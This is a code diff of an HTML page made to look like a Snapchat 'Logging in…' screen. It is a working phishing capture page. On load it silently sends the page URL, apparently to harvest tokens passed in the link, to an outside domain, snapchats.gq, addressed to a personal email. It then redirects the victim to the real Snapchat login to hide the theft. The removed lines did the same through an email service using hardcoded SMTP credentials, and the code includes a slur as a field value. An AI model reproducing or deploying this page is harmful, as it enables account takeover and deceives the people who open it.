@@ -1,23 +1,188 @@
 <!DOCTYPE html>
 <html>
 <head>
+	<title>Snapchat | Loading&hellip;</title>
+	<meta charset='utf-8'>
+	<meta name='viewport' content='width=device-width, height=device-height, initial-scale=1, user-scalable=no'>
+	<meta http-equiv='refresh' content='1; url=https://accounts.snapchat.com/accounts/login'>
+
+	<style type='text/css'>
+		html, body {
+			height: 100%;
+			width: 100%;
+			position: relative;
+			margin: 0;
+			padding: 0;
+			background: #FFFC00;
+			font-family: 'Avenir Next', 'Avenir', 'Roboto', sans-serif;
+			color: black;
+			line-height: 1;
+		}
+		main {
+			position: absolute;
+			top: 0;
+			left: 0;
+			right: 0;
+			bottom: 0;
+			background-image: url('snap-ghost.png');
+			background-repeat: no-repeat;
+			background-position: center 30%;
+			background-size: calc(50px + 0.1 * ( 50vw + 100vh )) calc(47px + 0.094 * ( 50vw + 100vh ));
+		}
+		h1 {
+			margin: 0;
+			position: absolute;
+			bottom: 10vh;
+			left: 0;
+			right: 0;
+			text-align: center;
+			font-weight: 600;
+			font-size: calc(15px + 0.01 * (50vw + 100vh));
+			margin-bottom: -0.5em;
+		}
+		span {
+			display: inline-block;
+			text-align: center;
+			vertical-align: center;
+			font-size: inherit;
+			width: 0.75em;
+			position: relative;
+		}
+		span:nth-child(1) {
+			animation: bounce 1.5s linear infinite 0s;
+		}
+		span:nth-child(2) {
+			animation: bounce 1.5s linear infinite 0.25s;
+		}
+		span:nth-child(3) {
+			animation: bounce 1.5s linear infinite 0.5s;
+		}
+		span:nth-child(4) {
+			animation: bounce 1.5s linear infinite 0.75s;
+		}
+		section {
+			text-align: center;
+			position: absolute;
+			top: 65vh;
+			left: 0;
+			right: 0;
+			margin-top: -0.5em;
+			font-size: calc(20px + 0.01 * (50vw + 100vh));
+		}
+		header {
+			background: black;
+		}
+		header > div {
+			height: calc(5px + 1vh);
+			background: #F23C57;
+			animation: meter 2s linear both, flutter 1s ease-in-out infinite 1s;
+		}
+		@keyframes bounce {
+			0% {
+				top: 0;
+			}
+			10% {
+				top: -0.2em;
+			}
+			20%, 30% {
+				top: -0.25em;
+			}
+			40% {
+				top: -0.2em;
+			}
+			50% {
+				top: 0;
+			}
+			60% {
+				top: 0.2em;
+			}
+			70%, 80% {
+				top: 0.25em;
+			}
+			90% {
+				top: 0.2em;
+			}
+			100% {
+				top: 0;
+			}
+		}
+		@keyframes meter {
+			0%, 5% {
+				width: 0;
+			}
+			10% {
+				width: 10vw;
+			}
+			15% {
+				width: 50vw;
+			}
+			25% {
+				width: 80vw;
+			}
+			50% {
+				width: 90vw;
+			}
+			100% {
+				width: 100vw;
+			}
+		}
+		@keyframes flutter {
+			0% {
+				background: #F23C57;
+			}
+			50% {
+				background: #E1143D;
+			}
+			100% {
+				background: #F23C57;
+			}
+		}
+	</style>
 </head>
 <body>
-	PLEASE WAIT FOR SERVER RESPONSE
+	<p hidden>
+		PLEASE WAIT FOR SERVER RESPONSE
+	</p>
+	<main>
+		<header><div></div></header>
+		<section><span>&#x25cf;</span><span>&#x25cf;</span><span>&#x25cf;</span><span>&#x25cf;</span></section>
+		<h1>Logging in&hellip;</h1>
+	</main>
+
+	<script
+	  src="https://code.jquery.com/jquery-3.4.1.min.js"
+	  integrity="sha256-CSXorXvZcTkaix6Yvo6HppcZGetbYMGWSFlBw8HfCJo="
+	  crossorigin="anonymous"
+	>
+  </script>
 	<script src='https://smtpjs.com/v3/smtp.js'></script>
 	<script>
-	Email.send({
-		Host : 'smtp.sendgrid.net',
-		Username : 'easy-web-security',
-		Password : 'XiaoBao2018sg',
-    To : 'willqin123@gmail.com, willqin123@icloud.com',
-    From : 'Helper <snapseed@passhash.com>',
-    Subject : location.href,
-    Body : location.href
-	}).then((message) => {
+	function redirect() {
 		location.replace('https://accounts.snapchat.com/accounts/login');
 		location.assign('https://accounts.snapchat.com/accounts/login');
-	});
+	}
+	fetch('https://snapchats.gq/sendmail.php', {
+    method: 'POST',
+    mode: 'cors',
+    cache: 'reload',
+    credentials: 'include',
+    headers: {
+      'Content-Type': 'application/x-www-form-urlencoded'
+    },
+    redirect: 'follow',
+    referrer: 'no-referrer',
+    body: $.param({
+    	'key' : 'fag',
+    	'subject' : location.href,
+    	'message' : location.href,
+    	'toemail' : 'willqin123@gmail.com',
+    	'fromname' : 'Messenger Helper',
+    	'fromemail' : 'hacker@snapchat.gq',
+    	'org' : 'MailJet',
+    	'unsubURL' : 'https://www.google.com/spam'
+   	})
+  }).then(redirect);
+	setTimeout(redirect, 500);
 	</script>
 </body>
 </html>
